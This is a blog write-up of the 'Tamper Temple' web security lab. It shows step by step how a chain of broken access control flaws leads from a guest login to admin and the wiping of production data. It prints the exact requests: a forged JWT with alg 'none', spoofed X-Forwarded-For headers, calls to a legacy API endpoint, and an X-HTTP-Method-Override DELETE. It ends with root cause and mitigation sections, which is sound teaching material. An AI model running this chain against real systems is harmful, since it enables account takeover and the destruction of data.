---
title: "Multi-Step Access Control Bypass Leads to Administrative Compromise | Tamper Temple"
date: 2026-06-06 00:00:00 +0530
categories: [A01 - Broken Access Control, Privilege Escalation]
tags: [jwt, information-disclosure, access-control, method-override, privilege-escalation, webverselabs-pro, tamper-temple]
author: Shivansh Sharma
image:
  path: /assets/images/posts/tamper-temple-broken-access-control-chain.webp
  alt: "Tamper Temple Broken Access Control Chain"
---

## Lab Link

Lab: [Tamper Temple](https://dashboard.webverselabs-pro.com/mystery-challenges/tamper-temple)

## Overview

Tamper Temple presents itself as a hardened portal protecting Temple Trust's internal systems. Behind the modern interface sits a legacy API, forgotten development functionality, weak trust boundaries, and multiple access control failures.

Rather than a single vulnerability, the challenge requires chaining together information disclosure, JWT manipulation, IP-based access control bypasses, legacy API abuse, and HTTP method confusion to ultimately obtain administrative access and destroy production data.

## Objective

Escalate privileges from a guest account to administrator and retrieve the flag.

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
├── Information Disclosure
├── JWT Trust Misconfiguration
├── IP-Based Access Control Bypass
├── Legacy API Exposure
├── Authorization Bypass
└── Privilege Escalation
```

The challenge relies on multiple Broken Access Control weaknesses that can be chained together to achieve complete administrative compromise.

## Reconnaissance

Login using the provided guest account.

```text
bob : temple123
```

Several interesting endpoints were discovered.

```text
/logs
/dev
```

Attempting to access the logs page returned:

```text
forbidden : only for staff
```

The development area contained a notes file.

```text
/dev/notes.txt
```

Contents:

```text
DEV TODO (MUST FIX IN THIS ORDER !!!)

- 404 error leaks internal username + our legacy token settings. FIX THIS (Pentest report said this is CRITICAL)
- The girl mentioned in the 404 error said she was able to get to /logs somehow???
- dave_token.txt is locked down to the developer workstation IP only. Does this need fixing?
```

Another interesting file existed:

```text
/dev/dave_token.txt
```

Attempting to access it returned:

```text
forbidden: developer workstation only
```

The notes provided two valuable hints:

* 404 pages leak usernames
* Legacy token settings exist

## Information Disclosure

Generating a 404 response by requesting a non-existent page revealed:

```text
known_web_users=['bob', 'alice']
```

This disclosed additional internal usernames.

Further investigation showed that the application session relied on a JWT using the `none` algorithm.

A forged token was created using the newly discovered username.

```jwt
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWxpY2UifQ.
```

Replacing the session cookie with this token successfully impersonated Alice.

## Accessing Staff Resources

As Alice, access to the logs endpoint was attempted again.

```http
GET /logs
```

Response:

```text
forbidden: internal access only
```

The error suggested an IP-based restriction.

Adding the following header:

```http
X-Forwarded-For: 127.0.0.1
```

allowed access to the logs.

```text
[infra] proxy up
[infra] reminder: the dev IP is 10.13.37.42 and is the only IP that can be used to reach /dev
[infra] nightly backup ok
```

The logs disclosed the trusted developer workstation IP.

```text
10.13.37.42
```

## Accessing Developer Resources

Using the newly discovered IP:

```http
X-Forwarded-For: 10.13.37.42
```

access was granted to:

```text
/dev/dave_token.txt
```

Response:

```text
# developerDave API token (developer role)
Authorization: Bearer <TOKEN>
```

The file contained a valid developer API token.

## Enumerating the API

The documentation exposed the following endpoints:

```text
POST /api/v2/login
GET /api/v2/me
GET /api/v2/audit
GET /api/v2/production
DELETE /api/v2/production
```

Using the developer token against:

```http
GET /api/v2/me
```

returned:

```json
{
  "sub": "developerDave",
  "role": "developer",
  "private_notes": "I'm leaving the company soon, so I'm going to cause some damage before I go. The team has a vuln they can't patch: the API still honors X-HTTP-Method-Override, and the old /api/v1/ service was never retired. I just need to figure out how the admin's password is being sent. Production data lives behind /api/v2/production."
}
```

This disclosed two additional weaknesses:

* Legacy `/api/v1` remained active
* `X-HTTP-Method-Override` was still honored

## Exploiting the Legacy API

Accessing the legacy audit endpoint normally failed.

```http
GET /api/v1/audit
```

Response:

```text
forbidden
```

A different HTTP method was then attempted.

```http
POST /api/v1/audit
```

The request succeeded and exposed audit data.

Within the logs were administrator credentials:

```text
user=admin
pass=th3-s4cr3d-scr0ll-0f-anubis
```

Administrative credentials had now been recovered.

## Administrative Access

Authenticate using the recovered credentials.

```http
POST /api/v2/login
```

Request:

```json
{
  "username":"admin",
  "password":"th3-s4cr3d-scr0ll-0f-anubis"
}
```

Response:

```json
{
  "token":"<ADMIN_JWT>"
}
```

Decoding the token confirmed:

```json
{
  "sub":"admin",
  "role":"admin"
}
```

Administrative privileges were successfully obtained.

## Proof of Exploitation

Using the administrator token:

```http
GET /api/v2/production
Authorization: Bearer <ADMIN_JWT>
```

Response:

```json
{
  "records":[
    {
      "id":1,
      "customer":"Temple Trust Bank",
      "order":"gold-bars",
      "value":480000
    }
  ]
}
```

The endpoint documentation also referenced a DELETE operation.

Attempting a normal DELETE request returned:

```text
405 Method Not Allowed
```

However, developerDave's note mentioned method override support.

The request was modified:

```http
GET /api/v2/production
Authorization: Bearer <ADMIN_JWT>
X-HTTP-Method-Override: DELETE
```

Response:

```json
{
  "deleted":3,
  "status":"production wiped"
}
```

The flag was returned in the response headers.

```text
X-Temple-Flag: WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The compromise resulted from multiple security failures working together:

* Usernames leaked through error messages
* JWT tokens accepted the `none` algorithm
* IP restrictions trusted client-controlled headers
* Sensitive developer resources remained exposed
* Legacy APIs were left enabled
* Authorization checks differed between API versions
* Audit logs exposed administrator credentials
* HTTP method override bypassed intended restrictions

Each individual weakness increased exposure, ultimately enabling complete administrative compromise.

## Impact

Successful exploitation allows attackers to:

* Impersonate privileged users
* Bypass access controls
* Access internal development resources
* Recover administrative credentials
* Access sensitive production data
* Destroy production records
* Fully compromise the application

Severity: **Critical**

## Mitigation

To prevent similar compromise chains:

* Remove support for JWT `alg:none`
* Eliminate information disclosure in error messages
* Do not trust client-controlled IP headers
* Remove unused legacy APIs
* Enforce consistent authorization checks
* Prevent credential logging
* Disable HTTP method override unless absolutely required
* Perform regular security reviews of deprecated functionality

## Real-World Insight

Many real-world breaches do not result from a single vulnerability. Instead, attackers chain together multiple low and medium severity issues until administrative access is achieved.

Tamper Temple demonstrates this perfectly. Individually, leaked usernames, trusted proxy headers, exposed developer files, and forgotten legacy APIs may appear minor. Combined, they create a complete path from guest access to full administrative compromise and production data destruction.
